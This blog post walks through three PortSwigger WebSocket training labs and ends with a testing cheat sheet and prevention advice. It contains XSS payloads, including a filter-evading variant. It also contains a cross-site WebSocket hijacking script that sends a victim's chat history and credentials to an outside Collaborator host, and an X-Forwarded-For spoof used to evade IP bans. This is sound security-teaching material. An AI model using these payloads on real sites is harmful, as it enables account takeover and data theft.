---
title: "PortSwigger WebSocket Labs — Complete Walkthrough"
date: 2026-09-22 08:00:00 +0000
categories: [Web Penetration Testing]
tags: [WebSockets, PortSwigger, Web Security Academy, CSWSH]
description: "All 3 PortSwigger WebSocket labs: manipulating messages for XSS, cross-site WebSocket hijacking, and manipulating the handshake to bypass a filter and IP ban."
author: Paschal Sangawe
toc: true
---

WebSockets give a browser and server a persistent, two-way channel. The interesting security property is that **the handshake is an ordinary HTTP request** (with an `Upgrade: websocket` header), while the messages afterwards are not HTTP at all. That creates two classic bug classes:

- **Input handling** — WebSocket messages often bypass the validation and encoding that applies to normal HTTP requests, so they are a great place to find stored/reflected XSS.
- **Cross-site WebSocket hijacking (CSWSH)** — a CSRF vulnerability on the handshake, letting an attacker's page open an authenticated socket as the victim.

This post covers all **3 PortSwigger WebSocket labs**.

## Lab 1 — Manipulating WebSocket messages to exploit vulnerabilities
> **Picture goes here (#1).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `<img src=1 onerror='alert(1)'>`.
> _Save as_ `images/portswigger-websockets-labs/1.png` _then replace this block with_ `![Lab 1 — Manipulating WebSocket messages to exploit vulnerabilities](/images/portswigger-websockets-labs/1.png)`_._


**Difficulty:** Apprentice
**Goal:** Trigger XSS in the support agent's browser via a chat message.

The live-chat feature sends messages over a WebSocket. The client HTML-encodes `<` before sending, so a payload typed in the UI is neutralised — but the server trusts whatever arrives on the wire.

**Steps**

1. Click **Live chat** and send a message.
2. In Burp **Proxy → WebSockets history**, confirm the message is sent as a WebSocket frame.
3. Send a new message containing `<` and observe it is HTML-encoded by the client before transmission.
4. Enable WebSocket message interception (Proxy settings), send another chat message, and edit the frame to:

```html
<img src=1 onerror='alert(1)'>
```

5. The alert fires — and will also fire in the support agent's browser.

> **Picture goes here (#2).** The intercepted WebSocket frame with the XSS payload and the resulting alert.
> _Save as_ `images/portswigger-websockets-labs/2.png` _then replace this block with_ `![Lab 1 — Manipulating WebSocket messages to exploit vulnerabilities](/images/portswigger-websockets-labs/2.png)`_._

**Lesson:** validate and encode on the **server**, and treat WebSocket messages as untrusted input just like POST bodies. Never rely on client-side encoding.

## Lab 2 — Cross-site WebSocket hijacking (CSWSH)
> **Picture goes here (#3).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `<script>`.
> _Save as_ `images/portswigger-websockets-labs/3.png` _then replace this block with_ `![Lab 2 — Cross-site WebSocket hijacking (CSWSH)](/images/portswigger-websockets-labs/3.png)`_._


**Difficulty:** Practitioner
**Goal:** Exfiltrate the victim's chat history and recover their credentials.

The handshake authenticates using cookies only and has **no CSRF token**, so any origin can open a socket as the victim. Note the origin-check gap: unlike `fetch`, WebSockets are **not** protected by the Same-Origin Policy or CORS.

**Steps**

1. Open **Live chat**, send a message, and reload.
2. In **WebSockets history**, note that the `READY` command fetches past chat messages (this is our data source).
3. In **HTTP history**, find the WebSocket handshake (`GET /chat`) and confirm it carries no CSRF token.
4. Right-click the handshake → **Copy URL**.
5. Host this on the exploit server, replacing the URL (change `https://` to `wss://`) and the Collaborator URL:

```html
<script>
var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
ws.onopen = function() {
  ws.send("READY");
};
ws.onmessage = function(event) {
  fetch('https://YOUR-COLLABORATOR-URL', {method: 'POST', mode: 'no-cors', body: event.data});
};
</script>
```

6. **View exploit** and poll Collaborator — your own chat history arrives as HTTP request bodies.
7. **Deliver exploit to victim** and poll again. The victim's history contains a message with their **username and password**.
8. Log in as the victim.

> **Picture goes here (#4).** Collaborator interactions containing chat messages, including the victim's credentials.
> _Save as_ `images/portswigger-websockets-labs/4.png` _then replace this block with_ `![Lab 2 — Cross-site WebSocket hijacking (CSWSH)](/images/portswigger-websockets-labs/4.png)`_._

**Why it works:** the browser attaches the victim's cookies to the cross-site WebSocket handshake. Because the server doesn't verify the `Origin` header or require a CSRF token, it accepts the attacker's socket and streams the victim's data back.

## Lab 3 — Manipulating the WebSocket handshake to exploit vulnerabilities
> **Picture goes here (#5).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `<img src=1 onerror='alert(1)'>`.
> _Save as_ `images/portswigger-websockets-labs/5.png` _then replace this block with_ `![Lab 3 — Manipulating the WebSocket handshake to exploit vulnerabilities](/images/portswigger-websockets-labs/5.png)`_._


**Difficulty:** Practitioner
**Goal:** Bypass an XSS filter and an IP ban by tampering with the handshake.

A blacklist-based XSS filter blocks obvious payloads and the server **bans your IP** by terminating the connection.

**Steps**

1. Open **Live chat**, send a message, and find it in **WebSockets history**.
2. Right-click → **Send to Repeater**.
3. Resend with a basic payload:

```html
<img src=1 onerror='alert(1)'>
```

The attack is blocked and the connection is dropped.
4. Click **Reconnect** — it fails because your IP is now banned.
5. Add a spoofed address header to the **handshake** to evade the ban:

```http
X-Forwarded-For: 1.1.1.1
```

6. Click **Connect** — the socket reconnects.
7. Send an **obfuscated** payload that evades the filter:

```html
<img src=1 oNeRrOr=alert`1`>
```

The filter misses the mixed-case attribute and the backtick-call, so the alert fires.

> **Picture goes here (#6).** The spoofed `X-Forwarded-For` handshake reconnecting, then the obfuscated XSS firing.
> _Save as_ `images/portswigger-websockets-labs/6.png` _then replace this block with_ `![Lab 3 — Manipulating the WebSocket handshake to exploit vulnerabilities](/images/portswigger-websockets-labs/6.png)`_._

**Lessons:** blacklists are fragile — mixed casing and alternative syntax defeat naive filters. Never make security decisions (like bans) based on spoofable client headers such as `X-Forwarded-For`.

## WebSocket security cheat sheet

| Test | What to do |
|------|------------|
| Message input handling | Intercept frames; inject `<`, `"`, `'`, template and JSON payloads |
| Origin validation | Replay the handshake with a foreign `Origin` |
| CSRF on handshake | Check for tokens; cookie-only auth = CSWSH |
| Auth per message | Send privileged messages on a socket opened before role change |
| Filter bypass | Try case variation, backticks, `%`-encoding, malformed JSON |
| Ban evasion | Spoof `X-Forwarded-For` / `X-Real-IP` on the handshake |

## Prevention

- **Validate the `Origin` header on the WebSocket handshake** against an allow-list, and use unpredictable CSRF tokens tied to the session.
- Authenticate and **authorize every message**, not just the handshake — re-check permissions per action and on privilege changes.
- Treat WebSocket input as fully untrusted: validate server-side and context-encode on output.
- Do not rely on client-provided headers (`X-Forwarded-For`, `X-Real-IP`) for security decisions such as rate limiting or bans; use the connection's real metadata at the edge.
- Prefer robust, allow-list-based sanitisation over blacklists for XSS defence, and use `wss://` (encrypted) everywhere.

## Related posts

- [CORS labs](/posts/portswigger-cors-labs/)
- [API Testing labs](/posts/portswigger-api-testing-labs/)
- [SSRF labs](/posts/portswigger-ssrf-labs/)
- [SQL Injection lab series](/posts/portswigger-sqli-part-1-basics/)
